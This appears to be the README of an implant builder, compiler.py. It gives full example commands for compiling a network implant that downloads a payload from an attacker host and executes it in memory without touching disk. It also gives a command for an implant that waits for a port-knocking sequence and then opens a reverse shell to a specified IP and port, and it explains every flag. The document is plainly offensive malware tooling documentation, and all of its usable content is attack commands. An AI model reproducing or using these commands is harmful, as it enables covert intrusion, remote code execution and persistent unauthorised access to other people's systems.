# Compiler.py

## Quick Commands

### Download & Exec
```
python3 compiler.py -o sniffer -ip 192.168.1.242 -atkD http://192.168.1.213/payload --interface wlp41s0 -d
```

-o specifies the output name, -ip specifies the allowable ip list that the implant can run on, -atkD specifies the address to download data from, --interface is the interface to listen on, -d is for debugging

This is used to just download and execute some binary on a machine. The downloader does not download to a file, it downloads into memory and executes it in memory.

### Reverse Shell
```
python3 compiler.py -o sniffer -ip 192.168.1.247 -key 20000,30000,40000,50000 -size 4 -act PORT_KNOCK_LIST -delayT 5 -atkR -revip 192.168.1.213 -revport 44444 -d --interface wlp41s0
```

-o specifies the output name, -ip specifies the allowable ip list that the implant can run on, -key specifies the ports to listen for, -size is the number of ports in the key, -act specifies the activation method (which should mainly just be PORT_KNOCK_LIST), -delayT is the number of seconds it should wait until it tries to connect, -atkR specifies a reverse shell, -revip is the ip to connect to, -revport is the port to connect to, --interface is the interface to listen on, -d is for debugging